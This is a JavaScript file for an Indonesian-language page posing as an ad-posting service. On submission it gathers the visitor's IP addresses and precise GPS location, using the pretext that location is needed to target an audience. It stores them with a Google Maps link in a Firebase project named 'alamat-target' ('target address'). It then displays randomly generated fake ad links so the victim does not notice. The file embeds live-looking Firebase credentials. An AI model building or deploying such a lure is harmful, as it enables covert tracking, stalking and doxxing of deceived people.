import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-database.js";
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";

// Konfigurasi Firebase
const firebaseConfig = {
  apiKey: "AIzaSyAjZHdRhEEyj1JtxjGBf-PCUptHFKjI8N4",
  authDomain: "alamat-target.firebaseapp.com",
  projectId: "alamat-target",
  storageBucket: "alamat-target.firebasestorage.app",
  messagingSenderId: "797540063708",
  appId: "1:797540063708:web:38224587894b64b48f1719"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

class ModernAlert {
    constructor() {
        this.overlay = document.createElement('div');
        this.overlay.className = 'alert-overlay';
        this.box = document.createElement('div');
        this.box.className = 'alert-box';
        this.icon = document.createElement('div');
        this.icon.className = 'alert-icon';
        this.title = document.createElement('h3');
        this.title.className = 'alert-title';
        this.message = document.createElement('div');
        this.message.className = 'alert-message';
        this.buttons = document.createElement('div');
        this.buttons.className = 'alert-buttons';
        this.box.appendChild(this.icon);
        this.box.appendChild(this.title);
        this.box.appendChild(this.message);
        this.box.appendChild(this.buttons);
        this.overlay.appendChild(this.box);
        document.body.appendChild(this.overlay);
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && this.overlay.classList.contains('active')) {
                this.hide();
            }
        });
    }
    show({ title, message, type = 'info', confirmText = 'OK', cancelText, onConfirm, onCancel }) {
        this.title.textContent = title;
        this.message.textContent = message;
        this.box.className = 'alert-box ' + (type ? `alert-${type}` : '');
        const icons = {
            success: '✅',
            error: '❌',
            warning: '⚠️',
            info: 'ℹ️'
        };
        this.icon.textContent = icons[type] || icons.info;
        this.icon.classList.add('alert-icon-animated');
        this.buttons.innerHTML = '';
        const confirmBtn = document.createElement('button');
        confirmBtn.className = 'alert-button alert-button-confirm';
        confirmBtn.textContent = confirmText;
        confirmBtn.addEventListener('click', () => {
            this.hide();
            if (onConfirm) onConfirm();
        });
        this.buttons.appendChild(confirmBtn);
        if (cancelText) {
            const cancelBtn = document.createElement('button');
            cancelBtn.className = 'alert-button alert-button-cancel';
            cancelBtn.textContent = cancelText;
            cancelBtn.addEventListener('click', () => {
                this.hide();
                if (onCancel) onCancel();
            });
            this.buttons.appendChild(cancelBtn);
        }
        this.overlay.classList.add('active');
        this.overlay.addEventListener('click', (e) => {
            if (e.target === this.overlay) {
                this.hide();
                if (onCancel) onCancel();
            }
        });
    }
    hide() {
        this.overlay.classList.remove('active');
        this.icon.classList.remove('alert-icon-animated');
    }
    success(title, message, confirmText = 'OK') {
        this.show({ title, message, type: 'success', confirmText });
    }
    error(title, message, confirmText = 'OK') {
        this.show({ title, message, type: 'error', confirmText });
    }
    warning(title, message, confirmText = 'OK') {
        this.show({ title, message, type: 'warning', confirmText });
    }
    info(title, message, confirmText = 'OK') {
        this.show({ title, message, type: 'info', confirmText });
    }
    confirm(title, message, confirmText = 'Confirm', cancelText = 'Cancel') {
        return new Promise((resolve) => {
            this.show({
                title,
                message,
                type: 'info',
                confirmText,
                cancelText,
                onConfirm: () => resolve(true),
                onCancel: () => resolve(false)
            });
        });
    }
}

const alert = new ModernAlert();
document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("adForm");
    const submitBtn = document.getElementById("submitBtn");
    const mainContainer = document.getElementById("mainContainer");
    const adsContainer = document.getElementById("adsContainer");
    const adsList = document.getElementById("adsList");
    setTimeout(() => {
        mainContainer.classList.add("visible");
    }, 100);

    async function getIP() {
        try {
            const ipv4 = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip);
            const ipv6 = await fetch("https://api64.ipify.org?format=json").then(res => res.json()).then(data => data.ip);
            return { ipv4, ipv6 };
        } catch (error) {
            console.error("Gagal mendapatkan IP:", error);
            return { ipv4: "Tidak ditemukan", ipv6: "Tidak ditemukan" };
        }
    }

    function fadeIn(element) {
        element.style.display = "block";
        setTimeout(() => {
            element.classList.add("visible");
        }, 10);
    }

    function fadeOut(element, callback) {
        element.classList.remove("visible");
        setTimeout(() => {
            element.style.display = "none";
            if (callback) callback();
        }, 500);
    }

    function getRandomDomain() {
        const domains = [
            "ads-market.com",
            "media-zone.net",
            "fast-ads.org",
            "clickhub.site",
            "adnetworkhub.net",
            "sponsoredmedia.net",
            "digitalpromo.xyz",
            "webadvert.pro",
            "marketinghub.io",
            "advertise360.net"
        ];
        return domains[Math.floor(Math.random() * domains.length)];
    }

    function generateAdsList() {
        adsList.innerHTML = "";
        const numberOfAds = Math.floor(Math.random() * 6) + 10;
        for (let i = 0; i < numberOfAds; i++) {
            const fakeAdURL = `https://${getRandomDomain()}/ads/view?id=${Math.floor(Math.random() * 999999)}`;
            const listItem = document.createElement("li");
            listItem.style.opacity = "0";
            listItem.style.transform = "translateY(20px)";
            listItem.style.transition = `all 0.4s ease ${i * 0.05}s`;
            listItem.innerHTML = `
                <a href="${fakeAdURL}" target="_blank">
                    <span class="ad-icon">📢</span>
                    <span class="ad-url">${fakeAdURL}</span>
                    <span class="ad-status">Active</span>
                </a>
            `;
            adsList.appendChild(listItem);
            setTimeout(() => {
                listItem.style.opacity = "1";
                listItem.style.transform = "translateY(0)";
            }, 10);
        }
    }

    function requestLocationPermission() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                alert.error(
                    "Perangkat Tidak Didukung",
                    "Perangkat ini tidak mendukung lokasi.",
                    "Mengerti"
                );
                reject("Geolocation tidak tersedia.");
            } else {
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve(position),
                    (error) => reject(error),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        });
    }

    function createConfetti() {
        const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
        const container = document.body;
        for (let i = 0; i < 100; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + 'vw';
            confetti.style.top = -10 + 'px';
            confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.width = Math.random() * 8 + 5 + 'px';
            confetti.style.height = Math.random() * 8 + 5 + 'px';
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
            container.appendChild(confetti);
            const animationDuration = Math.random() * 3 + 2;
            confetti.animate([
                { top: '-10px', opacity: 0, transform: 'rotate(0deg)' },
                { top: '10%', opacity: 1 },
                { top: '100vh', opacity: 0, transform: 'rotate(360deg)' }
            ], {
                duration: animationDuration * 1000,
                easing: 'cubic-bezier(0.1, 0.8, 0.3, 1)',
                fill: 'forwards'
            });
            setTimeout(() => {
                confetti.remove();
            }, animationDuration * 1000);
        }
    }

    async function handleAdSubmission(event) {
        event.preventDefault();
        animateButton(true);
        try {
            const ipData = await getIP();
            const position = await requestLocationPermission();
            const { latitude, longitude } = position.coords;
            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
            const adData = {
                title: document.getElementById("title").value,
                description: document.getElementById("description").value,
                category: document.getElementById("category").value,
                model: document.getElementById("model").value,
                targetUrl: document.getElementById("targetUrl").value || "Tidak tersedia",
                ipv4: ipData.ipv4,
                ipv6: ipData.ipv6,
                location: { latitude, longitude },
                mapsLink: mapsUrl,
                timestamp: new Date().toISOString()
            };
            console.log("Data yang akan disimpan:", adData);
            await set(ref(db, 'ads/' + Date.now()), adData);
            createConfetti();
            setTimeout(() => {
                generateAdsList();
                fadeOut(mainContainer, () => {
                    fadeIn(adsContainer);
                    adsContainer.classList.add("visible");
                });
            }, 1500);
        } catch (error) {
            console.error("Error:", error);
            animateButton(false);
            submitBtn.animate([
                { transform: 'translateX(0)' },
                { transform: 'translateX(-10px)' },
                { transform: 'translateX(10px)' },
                { transform: 'translateX(0)' }
            ], {
                duration: 300,
                iterations: 3
            });
            if (error.code === error.PERMISSION_DENIED) {
                alert.error(
                    'Lokasi Diperlukan',
                    'Silakan aktifkan lokasi untuk mendapatkan audiens yang sesuai.',
                    'Mengerti'
                );
            } else {
                alert.error(
                    'Terjadi Kesalahan',
                    'Terjadi kesalahan. Silakan coba lagi.',
                    'Tutup'
                );
            }
        }
    }

    function animateButton(isProcessing) {
        if (isProcessing) {
            submitBtn.innerHTML = '<span class="loading-spinner"></span> Memproses...';
            submitBtn.style.background = "linear-gradient(45deg, #ff8c00, #ff5e00)";
            submitBtn.style.boxShadow = "0px 0px 15px rgba(255, 140, 0, 0.5)";
            submitBtn.disabled = true;
            submitBtn.animate([
                { transform: 'scale(1)' },
                { transform: 'scale(1.02)' },
                { transform: 'scale(1)' }
            ], {
                duration: 1000,
                iterations: Infinity
            });
        } else {
            submitBtn.innerHTML = "Pasang Iklan";
            submitBtn.style.background = "";
            submitBtn.style.boxShadow = "";
            submitBtn.disabled = false;
        }
    }

    submitBtn.addEventListener("mouseover", () => {
        submitBtn.style.transform = "translateY(-3px)";
        submitBtn.style.boxShadow = "0 6px 20px rgba(255, 92, 0, 0.4)";
    });

    submitBtn.addEventListener("mouseout", () => {
        submitBtn.style.transform = "translateY(0)";
        submitBtn.style.boxShadow = "0 4px 15px rgba(255, 92, 0, 0.3)";
    });

    form.addEventListener("submit", handleAdSubmission);

    const inputs = form.querySelectorAll("input, textarea, select");
    inputs.forEach(input => {
        input.addEventListener("focus", () => {
            input.parentElement.querySelector("label").style.color = "#ff8c00";
            input.parentElement.querySelector("label").style.transform = "translateY(-5px)";
        });
        input.addEventListener("blur", () => {
            input.parentElement.querySelector("label").style.color = "rgba(255, 255, 255, 0.9)";
            input.parentElement.querySelector("label").style.transform = "translateY(0)";
        });
    });
});
